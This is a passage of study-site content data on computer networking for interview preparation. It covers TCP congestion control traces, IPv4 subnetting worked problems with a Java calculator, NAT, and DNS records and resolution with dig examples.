        { table: { head: ["Scheme", "Sender window", "Receiver", "On a loss"], rows: [
          ["Stop-and-wait", "1", "1", "Resend the one frame after timeout"],
          ["Go-Back-N", "N ≤ 2<sup>k</sup> − 1 (k-bit seq numbers)", "Accepts only in-order; cumulative ACK", "Resend the lost frame <b>and everything after it</b>"],
          ["Selective Repeat", "N ≤ 2<sup>k−1</sup>", "Buffers out-of-order frames", "Resend only the lost frame"],
          ["TCP", "min(rwnd, cwnd) bytes", "Buffers out-of-order; cumulative ACK + SACK option", "Fast retransmit on 3 dup ACKs, else RTO timeout"]
        ] } },
        { p: "<b>Flow control</b>: every TCP ACK carries <b>rwnd</b> = free space in the receiver's buffer. The sender never has more than rwnd unacknowledged bytes, so a slow receiver can't be overrun. If rwnd hits 0 the sender stops and sends small <b>window probes</b> (persist timer) until the window reopens." },
        { p: "Throughput ceiling = window / RTT. With the classic 16-bit window (65,535 B) and RTT = 50 ms: 65,535 × 8 / 0.05 ≈ <b>10.5 Mbps</b> — no matter how fast the link. A 1 Gbps link with 50 ms RTT has a bandwidth-delay product of 10<sup>9</sup> × 0.05 = 5 × 10<sup>7</sup> bits = <b>6.25 MB</b>, which is why TCP has the <b>window scale</b> option (shift up to 14 → windows up to about 1 GiB)." }
      ] },
      { h: "Congestion control with a worked cwnd trace", blocks: [
        { p: "Flow control can't see a congested router in the middle. So the sender keeps its own estimate, <b>cwnd</b> (congestion window), and treats loss as the congestion signal. Effective window = <b>min(cwnd, rwnd)</b>." },
        { table: { head: ["Phase / event", "Rule (cwnd in MSS)", "Growth"], rows: [
          ["Slow start (cwnd &lt; ssthresh)", "cwnd += 1 for every ACK", "Doubles every RTT (exponential)"],
          ["Congestion avoidance (cwnd ≥ ssthresh)", "cwnd += 1 per RTT (≈ 1/cwnd per ACK)", "Linear — additive increase"],
          ["Timeout (RTO expires)", "ssthresh = cwnd / 2; cwnd = 1; back to slow start", "Severe — multiplicative decrease"],
          ["3 duplicate ACKs (TCP Reno)", "Fast retransmit the missing segment; ssthresh = cwnd / 2; cwnd = ssthresh (fast recovery)", "Halve, then linear"],
          ["3 duplicate ACKs (TCP Tahoe)", "Fast retransmit; ssthresh = cwnd / 2; cwnd = 1", "Same as timeout"]
        ] } },
        { p: "<b>Trace</b> (textbook convention: cwnd counted in MSS, starts at 1, initial ssthresh = 16, slow start is capped at ssthresh). A timeout happens after round 9 and 3 duplicate ACKs (Reno) after round 16." },
        { table: { head: ["Round (RTT)", "cwnd", "ssthresh", "Why"], rows: [
          ["1 → 5", "1, 2, 4, 8, 16", "16", "Slow start: doubles each RTT, reaches ssthresh"],
          ["6 → 9", "17, 18, 19, 20", "16", "Congestion avoidance: +1 per RTT"],
          ["— timeout at cwnd 20 —", "", "20/2 = 10", "ssthresh = 10, cwnd = 1"],
          ["10 → 14", "1, 2, 4, 8, 10", "10", "Slow start again; 8 → 16 would overshoot, so capped at 10"],
          ["15 → 16", "11, 12", "10", "Congestion avoidance"],
          ["— 3 dup ACKs at cwnd 12 —", "", "12/2 = 6", "Fast retransmit + fast recovery: cwnd = 6"],
          ["17 → 20", "6, 7, 8, 9", "6", "Congestion avoidance straight away (no slow start)"]
        ] } },
        { svg: `<svg viewBox="0 0 680 300" width="680" class="dg">
  <line class="ln" x1="50" y1="260" x2="660" y2="260"/>
  <line class="ln" x1="50" y1="260" x2="50" y2="30"/>
  <text class="tx-m" x="40" y="44" text-anchor="end" dominant-baseline="middle">24</text>
  <text class="tx-m" x="40" y="116" text-anchor="end" dominant-baseline="middle">16</text>
  <text class="tx-m" x="40" y="188" text-anchor="end" dominant-baseline="middle">8</text>
  <text class="tx-m" x="40" y="260" text-anchor="end" dominant-baseline="middle">0</text>
  <text class="tx-m" x="180" y="276" text-anchor="middle">5</text>
  <text class="tx-m" x="330" y="276" text-anchor="middle">10</text>
  <text class="tx-m" x="480" y="276" text-anchor="middle">15</text>
  <text class="tx-m" x="630" y="276" text-anchor="middle">20</text>
  <text class="tx-m" x="355" y="294" text-anchor="middle">transmission round (RTT)</text>
  <text class="tx-m" x="58" y="22">cwnd (MSS)</text>
  <line class="ln ln-d" x1="60" y1="116" x2="300" y2="116"/>
  <line class="ln ln-d" x1="300" y1="170" x2="540" y2="170"/>
  <line class="ln ln-d" x1="540" y1="206" x2="630" y2="206"/>
  <text class="tx-m" x="70" y="108">ssthresh 16</text>
  <text class="tx-m" x="470" y="182">ssthresh 10</text>
  <text class="tx-m" x="575" y="220">ssthresh 6</text>
  <polyline class="ln-a" points="60,251 90,242 120,224 150,188 180,116 210,107 240,98 270,89 300,80 330,251 360,242 390,224 420,188 450,170 480,161 510,152 540,206 570,197 600,188 630,179"/>
  <text class="tx tx-a" x="300" y="66" text-anchor="middle">timeout</text>
  <text class="tx tx-a" x="520" y="134" text-anchor="middle">3 dup ACKs</text>
</svg>`, caption: "The classic TCP Reno 'saw-tooth'. Dashed lines are ssthresh." },
        { ul: [
          "<b>Fast retransmit</b>: 3 duplicate ACKs (4 identical ACKs in total) mean later segments are arriving, so only one got lost — retransmit it now instead of waiting for the RTO.",
          "Why is a timeout punished harder than dup ACKs? A timeout means <i>nothing</i> is getting through (heavy congestion); dup ACKs prove the pipe still delivers.",
          "Real stacks: Linux starts with cwnd = 10 MSS (RFC 6928), not 1, and uses <b>CUBIC</b> by default; Google's <b>BBR</b> estimates bandwidth and RTT instead of waiting for loss. Know the names — the textbook Reno trace is what gets asked."
        ] },
        { tip: "One-line answer for 'flow vs congestion control': flow control stops the sender overwhelming the <b>receiver</b> (rwnd, advertised by the receiver); congestion control stops senders overwhelming the <b>network</b> (cwnd, inferred by the sender from loss). The sender obeys the smaller of the two." }
      ] }
    ],
    practice: [
      { q: "Client ISN = 1000, server ISN = 5000. Write the seq/ack numbers of the three handshake segments, and the seq number of the client's first data byte.", a: "SYN: seq=1000. SYN-ACK: seq=5000, ack=1001. ACK: seq=1001, ack=5001. The SYN consumed sequence number 1000, so the client's first data byte has seq = <b>1001</b>." },
      { q: "cwnd starts at 1 MSS, ssthresh = 32. What is cwnd in the 7th transmission round (no loss so far)? If a timeout then occurs, what are the new ssthresh and cwnd?", a: "RTT 1..6: 1, 2, 4, 8, 16, 32 (reaches ssthresh at round 6). Round 7: congestion avoidance → 33. So cwnd in round 7 = <b>33</b>. Timeout: ssthresh = ⌊33/2⌋ = 16, cwnd = 1." },
      { q: "Same as above, but the loss is detected by 3 duplicate ACKs with TCP Reno. New values?", a: "Fast retransmit + fast recovery: ssthresh = ⌊33/2⌋ = 16 and cwnd = 16 (textbook simplification; strictly Reno inflates to ssthresh + 3 during recovery, then deflates to ssthresh). It continues in congestion avoidance: 17, 18, …" },
      { q: "Receiver window is 64 KB (65,535 B) and RTT is 100 ms. What is the maximum TCP throughput? What window would saturate a 100 Mbps link on this path?", a: "Max throughput = 65,535 × 8 / 0.1 ≈ 5.24 Mbps. To fill 100 Mbps: BDP = 100 × 10<sup>6</sup> × 0.1 = 10<sup>7</sup> bits = 1.25 MB, so the window must be ≥ 1.25 MB — needs the window scale option." },
      { q: "Why does the active closer wait in TIME_WAIT and not the passive closer? How long?", a: "The active closer sends the <b>last ACK</b> of the connection. If that ACK is lost the passive side re-sends its FIN, and someone must still be around to ACK it. Waiting also lets delayed segments of the old connection die before the same 4-tuple is reused. Duration: 2 × MSL (60 s on Linux)." },
      { q: "Pick TCP or UDP and justify: (a) UPI payment API, (b) live cricket stream, (c) DNS lookup, (d) multiplayer game position updates, (e) file download.", a: "(a) TCP — every byte must arrive, in order. (b) UDP-based (QUIC/RTP) — a late frame is useless, prefer skipping to stalling (note: on-demand video like YouTube is usually over TCP/QUIC with buffering). (c) UDP — one small request/response, no handshake cost; falls back to TCP for large answers. (d) UDP — newest position replaces the old, retransmitting stale positions is harmful. (e) TCP — reliability and ordering." }
    ],
    related: ["cn:tcp-vs-udp", "cn:tcp-3-way-handshake", "cn:tcp-connection-termination", "cn:tcp-reliability", "cn:tcp-flow-vs-congestion-control", "cn:flow-control-arq", "cn:ports-well-known", "cn:sockets", "cn:socket-programming", "cn:syn-cookies", "cn:bandwidth-latency-throughput"]
  });

  /* ------------------------------------------------------------------ */
  /* D31 (part 1) — IPv4 addressing and subnetting                        */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-ip-subnetting",
    subject: "cn",
    title: "IPv4 addressing, CIDR & subnetting — 12 worked problems",
    minutes: 90,
    crux: [
      "IPv4 = 32 bits in 4 octets. <b>/n</b> means the first n bits are the network part; the remaining <b>32 − n</b> bits are host bits.",
      "Addresses in a subnet = 2<sup>32−n</sup>; <b>usable hosts = 2<sup>32−n</sup> − 2</b> (network address and broadcast address are reserved). /30 → 2 usable, /31 point-to-point → 2 (RFC 3021), /32 → one host.",
      "<b>Block size</b> = 256 − (mask octet value). Network = the multiple of the block size at or below the address; broadcast = next network − 1.",
      "Classes: A 1–126 (/8), B 128–191 (/16), C 192–223 (/24), D 224–239 multicast, E 240–255 reserved; 127.x loopback.",
      "Private (RFC 1918): <b>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</b>. Also 169.254.0.0/16 = APIPA (no DHCP), 100.64.0.0/10 = carrier-grade NAT.",
      "Borrowing b bits gives 2<sup>b</sup> subnets. Need h hosts → smallest k with 2<sup>k</sup> − 2 ≥ h, prefix = 32 − k."
    ],
    sections: [
      { h: "Classful addressing and private ranges", blocks: [
        { table: { head: ["Class", "Leading bits", "First octet", "Default mask", "Networks", "Hosts / network"], rows: [
          ["A", "0", "1 – 126", "255.0.0.0 (/8)", "2<sup>7</sup> − 2 = 126", "2<sup>24</sup> − 2 = 16,777,214"],
          ["B", "10", "128 – 191", "255.255.0.0 (/16)", "2<sup>14</sup> = 16,384", "2<sup>16</sup> − 2 = 65,534"],
          ["C", "110", "192 – 223", "255.255.255.0 (/24)", "2<sup>21</sup> = 2,097,152", "2<sup>8</sup> − 2 = 254"],
          ["D", "1110", "224 – 239", "—", "Multicast groups", "—"],
          ["E", "1111", "240 – 255", "—", "Reserved / experimental", "—"]
        ] } },
        { p: "Class A networks 0.x.x.x ('this network') and 127.x.x.x (loopback) are reserved, hence 126. Classes wasted addresses badly (a company needing 300 hosts had to take a whole class B of 65,534), so since 1993 the Internet uses <b>CIDR</b> (Classless Inter-Domain Routing): any prefix length /0 … /32, written <code>a.b.c.d/n</code>. Classes still appear in exam questions ('what class is 172.20.1.1?' → B)." },
        { table: { head: ["Range", "CIDR", "Purpose"], rows: [
          ["10.0.0.0 – 10.255.255.255", "10.0.0.0/8", "Private (big orgs, cloud VPCs)"],
          ["172.16.0.0 – 172.31.255.255", "172.16.0.0/12", "Private (Docker's default bridge uses 172.17.0.0/16)"],
          ["192.168.0.0 – 192.168.255.255", "192.168.0.0/16", "Private (home routers)"],
          ["127.0.0.0 – 127.255.255.255", "127.0.0.0/8", "Loopback (localhost = 127.0.0.1)"],
          ["169.254.0.0 – 169.254.255.255", "169.254.0.0/16", "Link-local / APIPA — you got no DHCP lease"],
          ["100.64.0.0 – 100.127.255.255", "100.64.0.0/10", "Carrier-grade NAT (Jio/Airtel mobile data)"]
        ] } },
        { warn: "172.32.0.1 is <b>public</b> — the private block stops at 172.31.255.255. Interviewers love this one." }
      ] },
      { h: "The subnetting method (do it the same way every time)", blocks: [
        { ol: [
          "Write the mask. Prefix /n → n ones. Octet values for 1–8 ones: <b>128, 192, 224, 240, 248, 252, 254, 255</b>.",
          "Find the <b>interesting octet</b> — the one where the mask is neither 255 nor 0.",
          "<b>Block size</b> = 256 − mask value in that octet.",
          "<b>Network address</b> = largest multiple of the block size ≤ the address's value in that octet; octets to the right become 0.",
          "<b>Broadcast</b> = network + block size − 1 in that octet; octets to the right become 255.",
          "<b>Host range</b> = network + 1 … broadcast − 1. <b>Usable hosts</b> = 2<sup>32−n</sup> − 2."
        ] },
        { table: { head: ["Prefix", "Mask", "Block (last octet)", "Addresses", "Usable hosts"], rows: [
          ["/24", "255.255.255.0", "256", "256", "254"],
          ["/25", "255.255.255.128", "128", "128", "126"],
          ["/26", "255.255.255.192", "64", "64", "62"],
          ["/27", "255.255.255.224", "32", "32", "30"],
          ["/28", "255.255.255.240", "16", "16", "14"],
          ["/29", "255.255.255.248", "8", "8", "6"],
          ["/30", "255.255.255.252", "4", "4", "2"]
        ] } },
        { p: "Why the mask works: a host ANDs its own IP and the destination IP with the mask. Same result → same subnet → deliver directly (ARP for the destination's MAC). Different → send to the default gateway." }
      ] },
      { h: "Worked problems 1–6: find network, broadcast, range, hosts", blocks: [
        { p: "<b>P1. 192.168.10.77/26</b> — mask 255.255.255.192, interesting octet = 4th, block = 256 − 192 = 64. Multiples of 64: 0, 64, 128, 192. 77 lies in 64–127." },
        { ul: ["Network <b>192.168.10.64</b>, broadcast <b>192.168.10.127</b>, hosts .65 – .126, usable 2<sup>6</sup> − 2 = <b>62</b>."] },
        { p: "<b>P2. 200.1.1.130/27</b> — mask 255.255.255.224, block 32. Multiples: 0, 32, 64, 96, 128, 160 … 130 lies in 128–159." },
        { ul: ["Network <b>200.1.1.128</b>, broadcast <b>200.1.1.159</b>, hosts .129 – .158, usable <b>30</b>."] },
        { p: "<b>P3. 172.31.200.9/29</b> — mask 255.255.255.248, block 8. 9 lies in 8–15." },
        { ul: ["Network <b>172.31.200.8</b>, broadcast <b>172.31.200.15</b>, hosts .9 – .14, usable <b>6</b>. (And yes — 172.31.x.x is private.)"] },
        { p: "<b>P4. 172.16.45.200/20</b> — /20 = 8 + 8 + 4 → mask 255.255.<b>240</b>.0, interesting octet = 3rd, block = 16. Multiples of 16: … 32, 48 … 45 lies in 32–47." },
        { ul: ["Network <b>172.16.32.0</b>, broadcast <b>172.16.47.255</b>, hosts 172.16.32.1 – 172.16.47.254, usable 2<sup>12</sup> − 2 = <b>4,094</b>."] },
        { p: "<b>P5. 10.5.100.3/13</b> — /13 = 8 + 5 → mask 255.<b>248</b>.0.0, interesting octet = 2nd, block = 8. 5 lies in 0–7." },
        { ul: ["Network <b>10.0.0.0</b>, broadcast <b>10.7.255.255</b>, hosts 10.0.0.1 – 10.7.255.254, usable 2<sup>19</sup> − 2 = <b>524,286</b>."] },
        { p: "<b>P6. Is 192.168.1.255/23 a valid host address? What about 192.168.0.255/23?</b> — /23 → mask 255.255.<b>254</b>.0, 3rd octet block = 2. Third octet 1 lies in 0–1, so the subnet is 192.168.0.0 – 192.168.1.255." },
        { ul: [
          "192.168.1.255 is the <b>broadcast</b> of 192.168.0.0/23 → <b>not</b> a valid host.",
          "192.168.0.255 is in the middle of the range → <b>valid host</b> (usable range 192.168.0.1 – 192.168.1.254, 510 hosts). Trap: '.255 is always broadcast' is only true for /24 and longer."
        ] }
      ] },
      { h: "Worked problems 7–12: design, VLSM, same-subnet, summarisation", blocks: [
        { p: "<b>P7. Split 192.168.1.0/24 into subnets of at least 50 hosts each. How many subnets, and what are they?</b> Need 2<sup>k</sup> − 2 ≥ 50 → k = 6 (62 hosts). Prefix = 32 − 6 = /26 → borrowed 2 bits → 2<sup>2</sup> = <b>4 subnets</b>, block 64." },
        { table: { head: ["Subnet", "Network", "Host range", "Broadcast"], rows: [
          ["1", "192.168.1.0/26", ".1 – .62", ".63"],
          ["2", "192.168.1.64/26", ".65 – .126", ".127"],
          ["3", "192.168.1.128/26", ".129 – .190", ".191"],
          ["4", "192.168.1.192/26", ".193 – .254", ".255"]
        ] } },
        { p: "<b>P8. 192.168.5.0/24 must be split into at least 6 subnets. Give the mask, hosts per subnet, and the 2nd and last subnet.</b> 2<sup>b</sup> ≥ 6 → b = 3 → /27, mask 255.255.255.224, <b>8 subnets of 30 hosts</b>, block 32. 2nd subnet: <b>192.168.5.32/27</b> (hosts .33 – .62, broadcast .63). Last (8th): <b>192.168.5.224/27</b> (hosts .225 – .254, broadcast .255)." },
        { p: "<b>P9. VLSM: allocate 192.168.100.0/24 to LANs of 100, 50 and 20 hosts plus one router-to-router link.</b> Always allocate <b>largest first</b> so blocks stay aligned." },
        { table: { head: ["Need", "Size chosen", "Subnet", "Usable range", "Broadcast"], rows: [
          ["100 hosts", "/25 (126)", "192.168.100.0/25", ".1 – .126", ".127"],
          ["50 hosts", "/26 (62)", "192.168.100.128/26", ".129 – .190", ".191"],
          ["20 hosts", "/27 (30)", "192.168.100.192/27", ".193 – .222", ".223"],
          ["2 (link)", "/30 (2)", "192.168.100.224/30", ".225 – .226", ".227"]
        ] } },
        { p: "Left over: 192.168.100.228 – .255 for future use." },
        { p: "<b>P10. Are 10.1.1.10/21 and 10.1.6.20/21 in the same subnet?</b> /21 → mask 255.255.<b>248</b>.0, 3rd-octet block = 8. 1 → 0–7; 6 → 0–7. Both are in <b>10.1.0.0/21</b> (broadcast 10.1.7.255) → <b>same subnet</b>, they talk directly without a router. (10.1.8.1 would be in the next subnet, 10.1.8.0/21.)" },
        { p: "<b>P11. Summarise 192.168.16.0/24, .17.0/24, .18.0/24, .19.0/24 into one route.</b> Write the 3rd octets in binary: 16 = 000100<b>00</b>, 17 = 000100<b>01</b>, 18 = 000100<b>10</b>, 19 = 000100<b>11</b>. The first 6 bits match → 16 + 6 = 22 common bits → <b>192.168.16.0/22</b> (covers 192.168.16.0 – 192.168.19.255, exactly the four /24s). This is supernetting / route aggregation." },
        { p: "<b>P12. A company has 10.0.0.0/8 and needs 1000 subnets. What prefix, how many hosts each, and what are the first three subnets?</b> 2<sup>b</sup> ≥ 1000 → b = 10 (1024 subnets) → /8 + 10 = <b>/18</b>, mask 255.255.192.0. Host bits = 14 → 2<sup>14</sup> − 2 = <b>16,382 hosts</b>. Block in the 3rd octet = 256 − 192 = 64: <b>10.0.0.0/18, 10.0.64.0/18, 10.0.128.0/18</b> (then 10.0.192.0, 10.1.0.0 …)." },
        { tip: "Speak the method out loud in the interview: 'mask octet 224, so block size 32; 130 falls in 128 to 159; network .128, broadcast .159, 30 usable'. The method earns marks even if you slip on arithmetic." }
      ] },
      { h: "Check your answers with code", blocks: [
        { code: `public class SubnetCalc {
    static long toLong(String ip) {
        long v = 0;
        for (String part : ip.split("[.]")) v = v * 256 + Integer.parseInt(part);
        return v;
    }

    static String toIp(long v) {
        return ((v >> 24) & 255) + "." + ((v >> 16) & 255) + "." + ((v >> 8) & 255) + "." + (v & 255);
    }

    static void show(String cidr) {
        String[] p = cidr.split("/");
        int prefix = Integer.parseInt(p[1]);
        long mask = prefix == 0 ? 0 : (0xFFFFFFFFL << (32 - prefix)) & 0xFFFFFFFFL;
        long network = toLong(p[0]) & mask;                       // AND with mask
        long broadcast = network | (~mask & 0xFFFFFFFFL);         // set all host bits to 1
        long usable = prefix >= 31 ? 0 : broadcast - network - 1; // /31 and /32 are special cases
        System.out.printf("%-18s mask=%-15s net=%-15s bcast=%-15s usable=%d%n",
                cidr, toIp(mask), toIp(network), toIp(broadcast), usable);
    }

    public static void main(String[] args) {
        show("192.168.10.77/26");   // net .64,  bcast .127, 62
        show("200.1.1.130/27");     // net .128, bcast .159, 30
        show("172.16.45.200/20");   // net 172.16.32.0, bcast 172.16.47.255, 4094
        show("10.5.100.3/13");      // net 10.0.0.0,   bcast 10.7.255.255,  524286
        show("192.168.1.255/23");   // bcast is 192.168.1.255 -> not a host
    }
}`, lang: "java", title: "SubnetCalc.java — network = ip AND mask, broadcast = network OR NOT mask" },
        { p: "IPv6 in one breath: 128-bit addresses written as 8 groups of hex (<code>2001:db8::1</code>, <code>::</code> compresses one run of zero groups), a /64 per LAN is standard, no broadcast (multicast instead), no NAT needed, hosts can self-configure (SLAAC), and the header is a fixed 40 bytes with no checksum and no router fragmentation." }
      ] }
    ],
    practice: [
      { q: "Find network, broadcast, first/last host and usable hosts for <b>10.10.10.200/28</b>.", a: "Mask 255.255.255.240, block 16. Multiples: … 192, 208. 200 lies in 192–207. Network 10.10.10.192, broadcast 10.10.10.207, hosts .193 – .206, usable 2<sup>4</sup> − 2 = <b>14</b>." },
      { q: "Find the subnet of <b>172.20.130.5/17</b>.", a: "/17 → mask 255.255.128.0, 3rd-octet block 128. 130 lies in 128–255. Network <b>172.20.128.0</b>, broadcast <b>172.20.255.255</b>, hosts 172.20.128.1 – 172.20.255.254, usable 2<sup>15</sup> − 2 = <b>32,766</b>." },
      { q: "What is the smallest subnet (prefix) that can hold 500 hosts? And 510? And 511?", a: "2<sup>k</sup> − 2 ≥ h. k = 9 gives 510 usable → 500 and 510 both fit in a <b>/23</b>. 511 needs k = 10 (1022 usable) → <b>/22</b>." },
      { q: "Given mask 255.255.255.248 on 192.168.50.0/24, how many subnets and how many hosts each? Is 192.168.50.23 a usable host?", a: "248 → /29, borrowed 5 bits from /24 → 2<sup>5</sup> = <b>32 subnets</b> of 2<sup>3</sup> − 2 = <b>6 hosts</b>. Block 8: 23 lies in 16–23, and 23 = 16 + 8 − 1 is the <b>broadcast</b> of 192.168.50.16/29 → not usable." },
      { q: "Which of these are private: 10.200.1.1, 172.15.0.1, 172.31.0.1, 192.169.1.1, 100.70.0.1?", a: "10.200.1.1 — private (10/8). 172.15.0.1 — public (below 172.16). 172.31.0.1 — private (172.16/12 ends at 172.31.255.255). 192.169.1.1 — public (only 192.168.x.x is private). 100.70.0.1 — shared/CGNAT space (100.64.0.0/10), not RFC 1918 but not publicly routable either." },
      { q: "Summarise 10.1.4.0/24, 10.1.5.0/24, 10.1.6.0/24 and 10.1.7.0/24.", a: "3rd octets 4–7 = 000001<b>00</b> … 000001<b>11</b>: first 6 bits match → /16 + 6 = <b>10.1.4.0/22</b> (10.1.4.0 – 10.1.7.255)." }
    ],
    related: ["cn:classful-addressing", "cn:private-ip", "cn:subnetting", "cn:cidr", "cn:ipv4-vs-ipv6", "cn:longest-prefix-match", "cn:ipv4-header", "cn:mac-vs-ip"]
  });

  /* ------------------------------------------------------------------ */
  /* D31 (part 2) — NAT, DNS, DHCP                                        */
  /* ------------------------------------------------------------------ */
  add({
    id: "cn-nat-dns-dhcp",
    subject: "cn",
    title: "NAT, DNS records & resolution, DHCP DORA",
    minutes: 50,
    crux: [
      "<b>NAT</b> rewrites private source IPs to a public IP at the router. <b>PAT / NAPT</b> (what home routers do) also rewrites ports, so thousands of devices share one public IP.",
      "<b>DNS</b> maps names to records. Key types: <b>A</b> (IPv4), <b>AAAA</b> (IPv6), <b>CNAME</b> (alias), <b>MX</b> (mail), <b>NS</b> (delegation), <b>TXT</b> (SPF/verification), <b>PTR</b> (reverse), <b>SOA</b> (zone info).",
      "Resolution: stub → <b>recursive resolver</b> (does the work) → <b>root</b> → <b>TLD</b> → <b>authoritative</b>. Client-to-resolver is recursive; resolver-to-servers is iterative. Answers cached by TTL.",
      "DNS uses <b>UDP 53</b>; TCP 53 for large responses and zone transfers.",
      "<b>DHCP DORA</b>: Discover (broadcast) → Offer → Request (broadcast) → Ack. UDP ports <b>67</b> (server) / <b>68</b> (client). Gives IP, mask, gateway, DNS, lease time."
    ],
    sections: [
      { h: "NAT — Network Address Translation", blocks: [
        { p: "There are only ~4.3 billion IPv4 addresses. NAT lets a whole private network (RFC 1918 addresses) sit behind one or a few public IPs. The router keeps a <b>translation table</b> and rewrites headers on the way out and back." },
        { table: { head: ["Inside (private) IP:port", "Outside (public) IP:port", "Destination"], rows: [
          ["192.168.1.10:51000", "49.36.12.7:40001", "142.250.183.14:443"],
          ["192.168.1.11:51000", "49.36.12.7:40002", "142.250.183.14:443"],
          ["192.168.1.10:51001", "49.36.12.7:40003", "13.107.42.14:443"]
        ] } },
        { p: "Two laptops even use the same source port 51000 — PAT tells them apart by giving each a different public port. A reply to 49.36.12.7:40002 is rewritten back to 192.168.1.11:51000." },
        { table: { head: ["Type", "Mapping", "Use"], rows: [
          ["Static NAT", "1 private ↔ 1 public, fixed", "Expose an internal server"],
          ["Dynamic NAT", "Private → one from a pool of public IPs", "Rare today"],
          ["PAT / NAPT (overload)", "Many private → 1 public, distinguished by port", "Every home / office router, cloud NAT gateways"],
          ["Port forwarding (DNAT)", "public:port → fixed private:port", "Hosting a game server at home"]
        ] } },
        { ul: [
          "Pros: conserves IPv4, hides internal topology, incoming connections are blocked by default (a side-effect, not a real firewall).",
          "Cons: breaks end-to-end connectivity (peer-to-peer apps need STUN/TURN hole punching), protocols that embed IPs in payload (FTP active mode, SIP) need helpers, adds state to the router. IPv6 removes the need for NAT."
        ] }
      ] },
      { h: "DNS record types", blocks: [
        { table: { head: ["Record", "Maps", "Example"], rows: [
          ["A", "name → IPv4", "<code>google.com. A 142.250.183.14</code>"],
          ["AAAA", "name → IPv6", "<code>google.com. AAAA 2404:6800:4009::200e</code>"],
          ["CNAME", "alias → canonical name (never at the zone apex)", "<code>www.shop.in. CNAME shop.in.</code>"],
          ["MX", "domain → mail server, with priority (lower wins)", "<code>gmail.com. MX 5 gmail-smtp-in.l.google.com.</code>"],
          ["NS", "zone → its authoritative name servers", "<code>google.com. NS ns1.google.com.</code>"],
          ["TXT", "free text: SPF, DKIM, domain verification", "<code>\"v=spf1 include:_spf.google.com ~all\"</code>"],
          ["PTR", "IP → name (reverse DNS, in in-addr.arpa)", "<code>14.183.250.142.in-addr.arpa. PTR …</code>"],
          ["SOA", "start of authority: primary NS, admin, serial, timers", "One per zone"],
          ["SRV", "service → host + port", "<code>_sip._tcp.example.com</code>"],
          ["CAA", "which CAs may issue certificates", "<code>0 issue \"letsencrypt.org\"</code>"]
        ] } },
        { p: "Every record has a <b>TTL</b> (seconds it may be cached). Low TTL (60 s) = fast failover but more queries; high TTL (1 day) = fewer queries but slow changes. Before migrating a server, lower the TTL a day in advance." }
      ] },
      { h: "DNS resolution flow", blocks: [
        { svg: `<svg viewBox="0 0 700 260" width="700" class="dg">
  <rect class="box-a" x="20" y="110" width="110" height="40" rx="6"/>
  <text class="tx tx-b" x="75" y="130" text-anchor="middle" dominant-baseline="middle">Browser / OS</text>
  <text class="tx-m" x="75" y="170" text-anchor="middle">checks own caches</text>
  <text class="tx-m" x="75" y="185" text-anchor="middle">+ hosts file first</text>
  <rect class="box-g" x="230" y="110" width="140" height="40" rx="6"/>
  <text class="tx tx-b" x="300" y="130" text-anchor="middle" dominant-baseline="middle">Recursive resolver</text>
  <text class="tx-m" x="300" y="170" text-anchor="middle">ISP / 8.8.8.8 / 1.1.1.1</text>
  <text class="tx-m" x="300" y="185" text-anchor="middle">caches by TTL</text>
  <rect class="box" x="500" y="20" width="180" height="40" rx="6"/>
  <text class="tx tx-b" x="590" y="40" text-anchor="middle" dominant-baseline="middle">Root server (.)</text>
  <rect class="box" x="500" y="110" width="180" height="40" rx="6"/>
  <text class="tx tx-b" x="590" y="130" text-anchor="middle" dominant-baseline="middle">TLD server (.com)</text>
  <rect class="box-p" x="500" y="200" width="180" height="40" rx="6"/>
  <text class="tx tx-b" x="590" y="220" text-anchor="middle" dominant-baseline="middle">Authoritative (google.com)</text>
  <line class="ln-a" x1="132" y1="122" x2="228" y2="122" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-a" x="180" y="112" text-anchor="middle">1 query</text>
  <line class="ln-a" x1="228" y1="140" x2="132" y2="140" marker-end="url(#dg-arr-a)"/>
  <text class="tx tx-a" x="180" y="156" text-anchor="middle">8 answer</text>
  <line class="ln" x1="372" y1="112" x2="498" y2="36" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="425" y="66" text-anchor="middle">2</text>
  <line class="ln" x1="498" y1="50" x2="372" y2="122" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="448" y="96" text-anchor="middle">3</text>
  <line class="ln" x1="372" y1="126" x2="498" y2="126" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="435" y="118" text-anchor="middle">4</text>
  <line class="ln" x1="498" y1="138" x2="372" y2="138" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="435" y="152" text-anchor="middle">5</text>
  <line class="ln" x1="372" y1="144" x2="498" y2="212" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="425" y="186" text-anchor="middle">6</text>
  <line class="ln" x1="498" y1="228" x2="372" y2="150" marker-end="url(#dg-arr)"/>
  <text class="tx tx-b" x="450" y="210" text-anchor="middle">7</text>
</svg>`, caption: "1 recursive query; 2–7 iterative queries (each server answers with a referral or the final answer); 8 final answer." },
        { ol: [
          "Browser cache → OS cache / <code>hosts</code> file → (router cache). Miss → stub resolver sends a <b>recursive</b> query to the configured resolver: 'give me the final answer for google.com A'.",
          "Resolver (cache miss) asks a <b>root</b> server. There are 13 root server names (a.root-servers.net … m), each anycast to hundreds of machines.",
          "Root replies with a <b>referral</b>: the NS records for <code>.com</code>.",
          "Resolver asks the <b>.com TLD</b> server.",
          "TLD replies with a referral: NS records for <code>google.com</code> (ns1.google.com …) plus their IPs ('glue').",
          "Resolver asks Google's <b>authoritative</b> server.",
          "Authoritative server returns the A / AAAA record (or a CNAME to follow).",
          "Resolver caches it for the TTL and returns it to the client, which also caches it."
        ] },
        { ul: [
          "<b>Recursive vs iterative</b>: recursive = 'do it all for me and give me the answer' (client → resolver). Iterative = 'tell me the best server to ask next' (resolver → root/TLD/authoritative).",
          "Transport: <b>UDP 53</b> — a query fits in one packet, no handshake. Falls back to <b>TCP 53</b> when the answer is too large (truncated flag set) and for zone transfers (AXFR) between primary and secondary servers. DoH / DoT encrypt DNS over HTTPS (443) / TLS (853).",
          "Attacks: <b>DNS spoofing / cache poisoning</b> (fake answers) — defence DNSSEC (signed records), random query IDs and source ports."
        ] },
        { code: `$ dig google.com A +short
142.250.183.14

$ nslookup -type=MX gmail.com
gmail.com   mail exchanger = 5 gmail-smtp-in.l.google.com.

$ dig +trace google.com      # shows root -> .com -> google.com referrals step by step`, lang: "bash", title: "Try it (output trimmed; IPs vary by location)" }
      ] },
      { h: "DHCP — DORA", blocks: [
